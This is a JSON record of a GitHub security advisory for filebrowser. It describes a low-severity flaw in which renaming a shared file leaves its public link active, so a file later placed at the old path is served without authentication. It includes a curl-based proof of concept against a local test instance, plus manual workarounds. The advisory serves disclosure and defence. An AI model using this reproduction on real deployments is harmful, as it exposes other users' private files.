@@ -1,0 +1,50 @@
+{
+  "global": null,
+  "id": "GHSA-m8v4-4w34-rrvf",
+  "repo": {
+    "cve_id": "CVE-2026-82237",
+    "cvss_severities": {
+      "cvss_v3": {
+        "score": 3.1,
+        "vector_string": "CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:L/I:N/A:N"
+      },
+      "cvss_v4": {
+        "score": null,
+        "vector_string": null
+      }
+    },
+    "cwe_ids": [
+      "CWE-459"
+    ],
+    "description": "## Summary\r\n\r\nShare records are keyed by path and are cleaned up when the shared path is deleted, but not when it is\r\nrenamed. After a shared file is renamed, its share record survives. The link 404s only while the old path\r\nis absent; as soon as any file appears at that path again - the owner re-uploads, another user with\r\ncreate permission writes there, a hook produces it - the old unauthenticated link, with its original\r\npassword and expiry, serves the new and unrelated file.\r\n\r\nVerified at v2.63.23, the final release. Every version that has both shares and rename is affected.\r\n\r\n## Details\r\n\r\nThe delete handler removes the shares that its delete invalidated:\r\n\r\n```go\r\n// http/resource.go:110 (resourceDeleteHandler)\r\nerr = d.store.Share.DeleteWithPathPrefix(file.Path, d.user.ID)\r\n```\r\n\r\nThe rename branch of `patchAction` deletes thumbnails and moves the file, with no equivalent cleanup:\r\n\r\n```go\r\n// http/resource.go:398-423 (patchAction, action == \"rename\")\r\n\t// delete thumbnails\r\n\terr = delThumbs(ctx, fileCache, file)\r\n\tif err != nil {\r\n\t\treturn err\r\n\t}\r\n\r\n\treturn fileutils.MoveFile(d.user.Fs, src, dst, d.settings.FileMode, d.settings.DirMode)\r\n```\r\n\r\n`resourceDeleteHandler` is the only caller of `DeleteWithPathPrefix` anywhere in the codebase.\r\n\r\n`withHashFile` resolves the stored path lazily, on every request (`http/public.go:41-53`): it builds a\r\n`FileInfo` for `link.Path` each time, so the link 404s while the path is missing and serves whatever file\r\nexists there once it reappears. The existence check added to `sharePostHandler`\r\n(`http/share.go:159-168`) only guards the moment the share is created - a rename re-creates the dangling\r\ncondition afterwards.\r\n\r\n## PoC\r\n\r\n```bash\r\nBASE=http://127.0.0.1:8099\r\nTOKEN=$(curl -s -X POST $BASE/api/login -H 'Content-Type: application/json' \\\r\n  -d '{\"username\":\"user\",\"password\":\"…\"}')\r\n\r\n# 1. create and share a file\r\ncurl -s -X POST \"$BASE/api/resources/a.txt\" -H \"X-Auth: $TOKEN\" --data 'OLD-CONTENT'\r\nHASH=$(curl -s -X POST \"$BASE/api/share/a.txt\" -H \"X-Auth: $TOKEN\" -d '{}' | jq -r .hash)\r\n\r\n# 2. unauthenticated download works\r\ncurl -s \"$BASE/api/public/dl/$HASH/a.txt\"          # → OLD-CONTENT\r\n\r\n# 3. rename the file (no share cleanup on this path)\r\ncurl -s -X PATCH \"$BASE/api/resources/a.txt?action=rename&destination=%2Fb.txt\" \\\r\n  -H \"X-Auth: $TOKEN\"\r\n\r\n# 4. link is dormant while the path is absent\r\ncurl -s -o /dev/null -w '%{http_code}\\n' \"$BASE/api/public/dl/$HASH/a.txt\"   # → 404\r\n\r\n# 5. a new, unrelated file lands at the old path\r\ncurl -s -X POST \"$BASE/api/resources/a.txt\" -H \"X-Auth: $TOKEN\" --data 'NEW-CONTENT'\r\n\r\n# 6. the OLD link now serves the NEW file, unauthenticated\r\ncurl -s \"$BASE/api/public/dl/$HASH/a.txt\"          # → NEW-CONTENT   (replayed 2/2)\r\n```\r\n\r\nSharing a file, **deleting** it and recreating it leaves the share dead (404) - the delete path cleans\r\nup, so the gap is specific to rename.\r\n\r\n## Impact\r\n\r\nA previously circulated public link silently resurrects and exposes a new, unrelated file that happens to\r\nland at the old path - unauthenticated, under the original link's password and expiry. A user who\r\nre-creates a file under a name they once shared reasonably assumes it is private, while the old link\r\nstill serves it. Exploitation is opportunistic rather than directed: the attacker holds an old link and\r\nwaits for content to reappear at that path.\r\n\r\n## Patches\r\n\r\nNone. The project is no longer maintained and no fix will ship.\r\n\r\n## Workarounds\r\n\r\n- Revoke the link by hand after renaming a shared path: list shares with `GET /api/shares` and delete\r\n  with `DELETE /api/share/{hash}`. Administrators see and can revoke every user's shares.\r\n- Give shares an expiry and a password, so a resurrected link is time-bounded and not anonymously usable.\r\n\r\n## References\r\n\r\n- GHSA-3q2p-72cj-682c - pre-created shares for non-existent paths (the creation-time existence check).\r\n- GHSA-pp88-jhwj-5qh5 - stale share left by a trailing-slash delete (the same impact class, on the delete\r\n  path).\r\n- GHSA-r6pg-pg54-rcr5 - share cleanup on delete matches only the deleter's own shares.\r\n",
+    "ghsa_id": "GHSA-m8v4-4w34-rrvf",
+    "html_url": "https://github.com/filebrowser/filebrowser/security/advisories/GHSA-m8v4-4w34-rrvf",
+    "identifiers": [
+      {
+        "type": "GHSA",
+        "value": "GHSA-m8v4-4w34-rrvf"
+      },
+      {
+        "type": "CVE",
+        "value": "CVE-2026-82237"
+      }
+    ],
+    "published_at": "2026-08-14T08:09:11Z",
+    "references": [],
+    "severity": "low",
+    "summary": "Renaming a shared file leaves the public share link behind",
+    "updated_at": "2026-08-31T19:51:26Z",
+    "vulnerabilities": [
+      {
+        "package": {
+          "ecosystem": "go",
+          "name": "github.com/filebrowser/filebrowser/v2"
+        },
+        "patched_versions": "",
+        "vulnerable_version_range": "<= 2.63.23"
+      }
+    ],
+    "withdrawn_at": null
+  },
+  "repository": "filebrowser/filebrowser"
+}
